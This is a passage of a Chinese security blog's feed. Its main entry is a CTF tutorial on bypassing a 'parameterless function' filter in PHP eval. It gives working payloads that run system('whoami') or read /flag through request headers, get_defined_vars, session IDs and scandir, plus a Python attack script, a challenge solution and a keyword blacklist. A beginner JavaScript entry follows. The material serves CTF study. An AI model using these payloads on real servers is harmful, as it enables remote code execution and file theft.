fb05dfc0171d754c8f233929241a3abd62bdb0e65253db1da2e90acc56f2d24a71678f3c2caa88ba93b0d892712baab5ff0569fe3a2b177fdd7c4ee561b16ace24f30dbfd4a6a164010e56465112415a67ea759ecf47139f58662453342abe75660f3b9578a00f97bb09708555ad4799ccc1a6779b5df74cfc5fd8a25cde878449851028ce8e2510754a00bf037f03db754fcf32e5ce8368a91dca8a020cdc5c906c63f23f4efefec13bd0351f7467a80c7c11b3db1e648ec6c06152c01f02606f6cf041269fdbbe9a41fc87abe1fb9cdff24689ef80c1473e592ba326b18ff9f23881c0d5fd7f8d802d54ce275555d47d62793b96a6ff3be1845395eb1e3d14b7b355fe1b750d85059cc266db25edabb4aec6b6ee91bdff63702f31dfb6271917a41f25c4537ddba67dfed89d889d85ad75f24b62aa826fe7756e654ebe5c84623bc9cb0dbc6446d85ffd2f2b03d6ed28be0f817f2be59c1ddd823bcf6ca064b29d37041ffeaa242aa510fd347d9a430eca402a47c70213742c80795488a670d0abef4b8db2946330a44e0481c75cb953bc9797c5cc2d6ef777c2bfbf953939509aca6d34b1fb441e3e20f3334ddfb9bc2d271bd0f90f430754670c802bfd218d1990a013154f8a95824e83009337c450595fadcd8aa46729dd089fee7cf715136cdffe2c14d6489194d7244241cfe1498dee5a2c14b0597875a003eaab13fa661761d5a69f16e0582a0f8dec84b228c41a6a41509b9c05460a6a612dd83a4033ff5fb24c9f7b44edb9b4e3fb41d8457462508597549615d468dd9e700ff94d39b582e73ce8db0762d10ef0c4a778254e1bf1f5415f3b7234d8386ac0ac2282447f92228801ab32c50ea30fded9e5fa36c54b290d2b66134720797144340283d0bf8259141dca0fbc2c645c89fc703cd221ceaef449633a96607280a362527f0c69185781e1ec77519612e3c221fa7c70fe696fbd565051e1ce2d40356b03ec44759a6f6fbf09028bc192e2dcacb4ae642f2c6f5e0b0b08d8cc645ab91b0c7dcef13ae10b3e1e10085603e348b89730c5246f9f6062796bd2ea6fffd637cdb37e84b8fce8f42aeea61cef0aa1a093eec12a76c3e8b29fcf26de403019f1221d8c9716f756dbebf9cd718dcd85077995a52259435f82ed05117dc4f24668814fc46d81764b23dc6e4b8909be3fdf4a512a4a6e31c4e76cb710af7a2fe45e8991a3478e73db219773c7c72096fbf20aaddbba21a47e4d3ac3194d08ff099ad40952b69356e720e006d4e697edc3ce74a153d4271c63d5d6b543577e844a47b1f98747236362b74f260a4c1f1d0ca6dd22567b767f3f73861882283d7b2ae3fb7b12951dfd47dc02cfba7b17da8e1774d95c66061e34ffb787763463c463d13995e8b6940baef66bd01c860c895ba245a3255191fb4b175c1779c51c684660b454729006a5ce29debd9850abbb1855167fe00c5c84eeeefcf874edfd510e54b3b28e29b0b56fc4ce4dffd45b233a1d6543604397d56f35cdf164040896416af95410d6c877ccec0bbe57ac53e2d5e59e4d345c9ab93cc34b4ffe8fb1691c273e33c913bfbc3b9bdc1ec32d36f7e28fcd9ec23c3dadafb3d9b562453396199d6307cce6febad73110a8d9393dad5e7a5beca6173636e75b17aa79daf5b1a8f4357af922a69a4857c1974ce2b76b047821969a9c4c5be2ebb333bedb06d951eef29b103377fb15853d95d014c5ca60322d5ffb26bb76ad075a935febeaac588bbde32431c98557ce1d5006fc9f9e765cca52c72472096963945026e4ddb3755fd66c6bcd1d4e327b91c804e54579ef9930e143914e1369348628ea32d868e5f662188ed0ec6d2b05d8862a0ed2e0d36fb53c325cf678444b0d710d9aecee1e1b6154b2ddaab2e394c334bb4d167493e2d7c9fbbceab230357c17a04eb8a2260c1af28945c2ded5b67df503cb36aa964865f2a42e8462ba426bd744d55a511ef5cd3a46a856d0fe375b186b93406c36e62192eaa646627ddb8aff7a30d8259b7069fdcc45577e2e4758af805aaf62342ddd70f05c98b624c1ff09447e9b1b47af6d3162c3af3be2c782b6280c4c4406b3ee0e46b045e97eaaa82453072c916355d240df7afe0899a0c843f508d7c7ba695b88ee124a6505fd9976e04288d654926a6829bc65482dd5a9f897d43b873fc4f0fcddd660d150f97ed0874e6c896fe8c83ae27d27753da6c340d4af45ff227e06c0981e75c2a4d9c71822813d878f4a3529225da0588e4df77b5ba909d56ff316b9d8028b038cb7a99668d2d97512b85119c2cba9d350f4a4787198fa8fd0695d50e913ec7170fc344fb6a324e7e8a8d6a2eed286df1451eb1bf6c1b245fd1b71592139b0b225fd703bc952d79daa95b9dfc7d61b0f2edd757c3b64ecbfbf5056edd2547782660b3292d5dfcb65f6f921e9aea080a45c400505fdf7378ad420c79a5c657c063c694b71a1678f78d1ed361fbc7a3d157b132264d2a17576cb8fc7c6597e7688c870b2498362adefb65ef9037a4f31e44c07174e624954f99fb8464db7a2f2319977e60f217dffa8b453646e433bdf7879bf666e0623820f5e8ef01e81ca14e2bda8cb55a8553d70f03cf865a7b026724716b943f077b508016b37878f7d8e4cf5b25dfad06f219223fa6a1d2cd9ef3900245dc168a3601a6fcde3bbdf34fae75f883ca9841881aa56f87fabc451642a4775d62adb47e88188f0226d2102899637fce299594f401586c4d0c2b63178fe78b39160cfa30342863d96c85e7a7b84be0757aac6b107d7ef19a6c40d1e87b27f46734acdac3aa40dbb10bf50ae63e4a992fb64929ab2277d8d6e18c52d4aaa8a930589e30e9b39498dede04a12b8c75921c5f31ddf02f5d4b611bd591f9292714c8eb683d5fa656a5602135a9d21cea177bb76b3c604670c9818249d92036b4572d13b6ed069a2cc6f2c1d093a112cda2950247d838f9f08220f5f42f1ecb7d2ab7c0b087c460334cdd77bf8226483cebcff03e837e87b290250d807691948fd838c891720025fb90deb375dea625e3c88e7f9278ad7aaf1a81cb89cc47ffdab88a1c326b93b6f0df9f087340fe8ee6d7f4efa9311eb86c345bc972c26b6d03f1cebafd47c4aea3d612e9658940a96f2e0370af498d6d1071248e3f4f5fcdaca49d168b487f67a7eb97519453d2b1345b48f9962880dd7ac9874fcef1c144c66520e69c403b7919dbf29a92ba1add7cac8cf18e08e4cb159d6ee6773590f982706c2a874c87e224bf5266216242dc70647dd1b1444aeaefce9c064f5b2b3cd4bf89e0cddf48e3ec7a4477299f7904bec1ad5b1a4dd0bc0505ded926d2bf5bb8b8b211cbee75c31d1e4f30bd4c75b809adb20df3839ede1870e1df5fe0ad960e2f8f50ff81ef813b43db67858ae82b7f8c7b862fa0dea656afe747f99e1aa33335b1154b3d3c5ae6c7c2977c19a1ca23061b3f6d58a7c9d1447c08a2bf61c805736285d64127321bed70fb3cb068235fa507e9b2f66f1213782981180a6419df7e0772dded20a12928ced038cab6c32822f0387dedf118a2efacc797e1490cb3158d18db98bfc0ff34d503a71f21dbcd8cce32350a5b1a3420b46e8cb06dfab02d00043793073e4e4c1b41b866cd2eb1ea1930785bd956f8c3f17ba657618ebb0b55b7ce079cfeed286ef284153fa9a2d9573b84153a7beeff5dabe4197879ae6b384d4ca420c7c7baf38caa8a574eefca7caba10674f692313108fcc1cc75c15772b2af8e302a2395fc5fb144957c66ddfee5962e90069d9e5ab664e364178dd9ebd48c56a5c0e8300ece89f7e8942d64d349ebd2d256d85895bfd7ccec0e5b3a92b505d09a69e4e3b68af0fe3f4c64d4868eed07319481fd3e66f7838af252d4c2be742c9311a19e861b943d8a958dd8b8b7d330d1f7e87d88ad145550908e7ad39fa877a06988f7896b26c7495ff4e8e8c2df995db8d1b573a2f4845dc3e7670fc953126577e830680529c7699099c993ef5e9c830ab94ab40ebf210af0467979c527e4169922afbfb3658781b69e2bd03909273bf42eb97b35eaf46e5712c6bfb8dca889bfbc5a9150279dfa3449254854d24f057010fdf6d6e5b40832fca929ab000333354cc354c96e09780d9541509c6f3d25ff849e7999715f72249ab6980b476e3fc45f93175cc368abdc24af68a604eb577a3a76eaa24b4258f07a38e0bacb96f418ade7da128e98cee6840567db80462b9821eb699651683c7b53afcac8862675d91eb952f1e834f152aa8206eedb1262ac6cf016dc3e506c67a7daf194f2b785da7b927b4f477c81c681dfedd187c831622ebe98668a03728dc70edccadd87a62f6f6e4d90</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>无参数rec</title>
    <link href="https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/"/>
    <id>https://sakurahack-y.github.io/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/</id>
    <published>2022-04-10T06:32:10.000Z</published>
    <updated>2022-04-10T17:33:42.106Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><pre><code class="php">&lt;?phphighlight_file(__FILE__);if(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])) &#123;        eval($_GET[&#39;code&#39;]);&#125;?&gt;</code></pre><p>这里使用preg<em>replace替换匹配到的字符为空，\w匹配字母、数字和下划线，等价于 [^A-Za-z0-9</em>]，然后(?R)?这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数），将匹配的替换为空，判断剩下的是否只有;<br>以上正则表达式只匹配a(b(c()))或a()这种格式，不匹配a(“123”)，也就是说我们传入的值函数不能带有参数，所以我们要使用无参数的函数进行文件读取或者命令执行。</p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><pre><code class="php">目录操作：getchwd() ：函数返回当前工作目录。scandir() ：函数返回指定目录中的文件和目录的数组。dirname() ：函数返回路径中的目录部分。chdir() ：函数改变当前的目录。数组相关的操作：end() - 将内部指针指向数组中的最后一个元素，并输出。next() - 将内部指针指向数组中的下一个元素，并输出。prev() - 将内部指针指向数组中的上一个元素，并输出。reset() - 将内部指针指向数组中的第一个元素，并输出。each() - 返回当前元素的键名和键值，并将内部指针向前移动。array_shift() - 删除数组中第一个元素，并返回被删除元素的值。array_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。array_slice() 函数在数组中根据条件取出一段值，并返回。array_reverse() 函数返回翻转顺序的数组。读文件show_source() - 对文件进行语法高亮显示。readfile() - 输出一个文件。highlight_file() - 对文件进行语法高亮显示。file_get_contents() - 把整个文件读入一个字符串中。readgzfile() - 可用于读取非 gzip 格式的文件    编码chr() 函数从指定的 ASCII 值返回字符。hex2bin() — 转换十六进制字符串为二进制字符串。</code></pre><h1 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h1><h2 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h2><p>**getenv():**获取环境变量的值(在PHP7.1之后可以不给予参数)</p><p>适用于：php7以上的版本</p><p>php7.0以下版本返回bool(false)</p><pre><code>?code=var_dump(getenv());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235047746.png" alt="image-20220410235047746"></p><p>php7.0以上版本</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235228226.png" alt="image-20220410235228226"></p><p>还可以通过这个打开phpinfo()页面</p><pre><code>?code=var_dump(getenv(phpinfo()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235551070.png" alt="image-20220410235551070"></p><h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>**getallheaders:**获取所有 HTTP 请求标头，是apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用</p><pre><code>?code=print_r(getallheaders());</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220410235935581.png" alt="image-20220410235935581"></p><p><strong>payload1</strong></p><pre><code>?code=eval(reset(getallheaders()));# post中增加请求头flag: system(&#39;whoami&#39;);</code></pre><p>在我的burp中经过测试，设置的请求头跑到了最前面，这个问题我也很奇怪，网上流传的是取最后一个头，那我这里就取第一个吧。</p><p>测试一下，在这里添加请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000647293.png" alt="image-20220411000647293"></p><p>输出一下第一个请求头</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411000715021.png" alt="image-20220411000715021"></p><p>我们发现我们构造的请求头在最开始，那么我们就可以构造出payload。其实在开头还是结尾，问题都不大，灵活变通即可。</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001023643.png" alt="image-20220411001023643"></p><p><strong>payload2</strong></p><p>在php7以上的版本使用</p><pre><code>?code=eval(end(apache_request_headers()));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001253812.png" alt="image-20220411001253812"></p><h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p><strong>get_defined_vars():</strong></p><pre><code>返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files</code></pre><p><strong>current:</strong></p><pre><code>返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值</code></pre><p><strong>payload1</strong></p><pre><code>?code=eval(end(current(get_defined_vars())));&amp;flag=system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411001923627.png" alt="image-20220411001923627"></p><p><strong>payload2</strong></p><pre><code>?flag=system(&#39;whoami&#39;);&amp;code=eval(reset(current(get_defined_vars())));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002114740.png" alt="image-20220411002114740"></p><p><strong>payload3</strong></p><pre><code>?flag=phpinfo();&amp;code=eval(pos(pos(get_defined_vars())));</code></pre><p><strong>pos函数:</strong></p><pre><code>pos()是PHP中的内置函数，用于返回内部指针当前指向的数组中元素的值。返回值后，pos()函数不会递增或递减内部指针。</code></pre><p>解释下这个payload</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002640375.png" alt="image-20220411002640375"></p><p>我们发现flag的值是被嵌套在两个数组中，因此如果要取出flag的值，要执行两次pos</p><p>第一次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002803950.png" alt="image-20220411002803950"></p><p>第二次pos：</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002837861.png" alt="image-20220411002837861"></p><p>成功取出，加上eval函数就可以执行了</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411002921084.png" alt="image-20220411002921084"></p><p><strong>payload4</strong></p><pre><code class="python">import requestsfiles = &#123;   &quot;system(&#39;whoami&#39;);&quot;: &quot;&quot;&#125;#data = &#123;#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;#&#125;r = requests.post(&#39;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#39;, files=files)print(r.content.decode(&quot;utf-8&quot;, &quot;ignore&quot;))</code></pre><p><code>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</code></p><h2 id="session-start-函数"><a href="#session-start-函数" class="headerlink" title="session_start()函数"></a>session_start()函数</h2><p>适用于：php7以下的版本</p><p><strong>session_start()</strong></p><pre><code>启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()</code></pre><p><strong>session_id()</strong></p><pre><code>获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）</code></pre><p>可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。</p><p>但其有限制：</p><p><strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p><p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了。</p><p><strong>hex2bin()</strong></p><pre><code>转换16进制字符串为二进制字符串</code></pre><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>payload</p><pre><code>?code=eval(hex2bin(session_id(session_start()))); HTTP/1.1Cookie: PHPSESSID=73797374656d282777686f616d6927293b  # system(&#39;whoami&#39;);</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411010515707.png" alt="image-20220411010515707"></p><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code> show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))); highlight_file(session_id(session_start())); readfile(session_id(session_start())); 然后抓包传入Cookie: PHPSESSID=(想读的文件)即可</code></pre><p>payload</p><pre><code>GET /1.php?code=show_source(session_id(session_start())); HTTP/1.1Cookie: PHPSESSID=/flag</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/20220109194247-442d62d6-7141-1.png" alt="img"></p><p>这种方法我并没有测试成功，先写下来吧。</p><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir"></a>scandir</h2><p><strong>查看当前目录文件名</strong></p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011259622.png" alt="image-20220411011259622"></p><p>文件读取</p><p><strong>读取当前目录文件</strong></p><pre><code>当前目录倒数第一位文件：show_source(end(scandir(getcwd())));show_source(current(array_reverse(scandir(getcwd()))));当前目录倒数第二位文件：show_source(next(array_reverse(scandir(getcwd()))));随机返回当前目录文件：highlight_file(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));show_source(array_rand(array_flip(scandir(current(localeconv())))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011558669.png" alt="image-20220411011558669"></p><p>多试几次</p><p><strong>查看上一级目录文件名</strong></p><pre><code>print_r(scandir(dirname(getcwd())));print_r(scandir(next(scandir(getcwd()))));print_r(scandir(next(scandir(getcwd()))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011321325.png" alt="image-20220411011321325"></p><p>函数解释</p><pre><code>array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。array_flip()和array_rand()配合使用可随机返回当前目录下的文件名dirname(chdir(dirname()))配合切换文件路径</code></pre><p><strong>查看和读取根目录文件</strong></p><p>所获得的字符串第一位有几率是/，需要多试几次</p><pre><code>print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411011343731.png" alt="image-20220411011343731"></p><h1 id="ctf题目讲解"><a href="#ctf题目讲解" class="headerlink" title="ctf题目讲解"></a>ctf题目讲解</h1><h2 id="NoRce"><a href="#NoRce" class="headerlink" title="NoRce"></a>NoRce</h2><p>源码：</p><pre><code class="php">&lt;?phphighlight_file(__FILE__);$exp = $_GET[&#39;exp&#39;];//php7.3 + Apacheif(&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $exp)) &#123;    if(!preg_match(&quot;/o|v|b|print|var|time|file|sqrt|path|dir|exp|pi|an|na|en|ex|et|na|dec|true|false|[0-9]/i&quot;, $exp))&#123;        eval($exp);    &#125;else&#123;        exit(&#39;NoNoNo,U R Hacker~&#39;);    &#125;&#125;else&#123;    exit(&quot;What&#39;s this?&quot;);&#125;?&gt;</code></pre><p>过滤相当严格</p><p>测试一下，发现</p><pre><code>apache_request_headers();</code></pre><p>没有被过滤</p><p>我们还可以利用其它几个没有被过滤的函数构造payload</p><pre><code>die() 函数输出一条消息，并退出当前脚本array_shift() - 删除数组中第一个元素，并返回被删除元素的值</code></pre><p>在我的电脑中，需要把flag头，放在host前，具体原因未知</p><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013150830.png" alt="image-20220411013150830"></p><p>此时arry_shift()返回的值就是我们要执行的命令</p><p>payload</p><pre><code>?exp=system(array_shift(apache_request_headers()));# postflag: whoami</code></pre><p><img src="/2022/04/10/%E6%97%A0%E5%8F%82%E6%95%B0rec/image-20220411013259840.png" alt="image-20220411013259840"></p><p>成功执行命令</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h1&gt;&lt;pre&gt;&lt;code class=&quot;php&quot;&gt;&amp;lt;?php
highlight_file(__FIL</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="代码执行" scheme="https://sakurahack-y.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>浅学javascript</title>
    <link href="https://sakurahack-y.github.io/2022/04/07/%E6%B5%85%E5%AD%A6javascript/"/>
    <id>https://sakurahack-y.github.io/2022/04/07/%E6%B5%85%E5%AD%A6javascript/</id>
    <published>2022-04-07T13:25:06.000Z</published>
    <updated>2022-04-11T07:29:26.288Z</updated>
    
    <content type="html"><![CDATA[<p>该来的永远跑不掉，该补的早晚要补，诶，好好学javascript，我爱学习！！！！！</p><p>[TOC]</p><h1 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213804320.png" alt="image-20220407213804320"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213723069.png" alt="image-20220407213723069"></p><h1 id="javascript的组成部分"><a href="#javascript的组成部分" class="headerlink" title="javascript的组成部分"></a>javascript的组成部分</h1><p>html是骨架，css是对页面进行渲染，js绝对这个页面可以做什么</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407213908008.png" alt="image-20220407213908008"></p><p>javascript由BOM,DMO,ECMAScript组成 </p><p><strong>BOM</strong></p><p>全名-Browser Object Model,指的是js操作浏览器发送变化的属性和方法</p><p><strong>DOM</strong></p><p>全名-Document Object Model,指的是操作文档流发生变化的属性和方法</p><p><strong>ECMAScript</strong></p><p>指的是JS代码的书写语法和书写规则</p><h1 id="JavaScript-书写位置"><a href="#JavaScript-书写位置" class="headerlink" title="JavaScript 书写位置"></a>JavaScript 书写位置</h1><p><strong>行内式</strong></p><p>a标签-书写在href属性上</p><pre><code class="javascript">&lt;a href=&quot;javascript: JS代码;&quot;&gt;点我一下&lt;/a&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215348244.png" alt="image-20220407215348244"></p><p>非a标签-书写在行为属性上</p><pre><code class="javascript">&lt;div onclick=&quot;alert(&#39;hello word&#39;)&quot;&gt;点我一下&lt;/div&gt;</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215601888.png" alt="image-20220407215601888"></p><p><strong>内嵌式</strong></p><p>把代码书写在一个script标签对里面,不需要依赖任何行为，打开网页就会执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407215824582.png" alt="image-20220407215824582"></p><p><strong>外链式</strong></p><p>把代码书写在一个.js文件内，外链式js代码，不需要依赖任何行为，打开页面就会执行</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220351326.png" alt="image-20220407220351326"></p><h1 id="JavaScript定义变量"><a href="#JavaScript定义变量" class="headerlink" title="JavaScript定义变量"></a>JavaScript定义变量</h1><pre><code class="javascript">var num = 100</code></pre><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220943173.png" alt="image-20220407220943173"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407220903524.png" alt="image-20220407220903524"></p><h1 id="三种输出方式"><a href="#三种输出方式" class="headerlink" title="三种输出方式"></a>三种输出方式</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221044266.png" alt="image-20220407221044266"></p><h1 id="JS的数据类型"><a href="#JS的数据类型" class="headerlink" title="JS的数据类型"></a>JS的数据类型</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221242187.png" alt="image-20220407221242187"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221932277.png" alt="image-20220407221932277"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221440539.png" alt="image-20220407221440539"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221511452.png" alt="image-20220407221511452"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407221817260.png" alt="image-20220407221817260"></p><h1 id="JavaScript数据类型转换"><a href="#JavaScript数据类型转换" class="headerlink" title="JavaScript数据类型转换"></a>JavaScript数据类型转换</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222131138.png" alt="image-20220407222131138"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222415779.png" alt="image-20220407222415779"></p><p>当可以合法转换就正常转换，当无法合法转换时，值就变为NAN</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230433762.png" alt="image-20220407230433762"></p><p>当可以合法转换就正常转换，当无法合法转换时，如果原值以字母，则返回值为NAN，如果原值以数字+字符串开头，则返回前面的数字而忽略字符串</p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222543001.png" alt="image-20220407222543001"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407222630874.png" alt="image-20220407222630874"></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407230952623.png" alt="image-20220407230952623"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231034790.png" alt="image-20220407231034790"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231109372.png" alt="image-20220407231109372"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231129915.png" alt="image-20220407231129915"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231232353.png" alt="image-20220407231232353"></p><h1 id="条件分支语句"><a href="#条件分支语句" class="headerlink" title="条件分支语句"></a>条件分支语句</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231403054.png" alt="image-20220407231403054"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231436373.png" alt="image-20220407231436373"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407231551013.png" alt="image-20220407231551013"></p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232532028.png" alt="image-20220407232532028"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232436701.png" alt="image-20220407232436701"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232646209.png" alt="image-20220407232646209"></p><h1 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232807115.png" alt="image-20220407232807115"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232828922.png" alt="image-20220407232828922"></p><h1 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h1><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407232920259.png" alt="image-20220407232920259"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233013700.png" alt="image-20220407233013700"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233022496.png" alt="image-20220407233022496"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233059818.png" alt="image-20220407233059818"></p><p><img src="/2022/04/07/%E6%B5%85%E5%AD%A6javascript/image-20220407233136738.png" alt="image-20220407233136738"></p><p><img 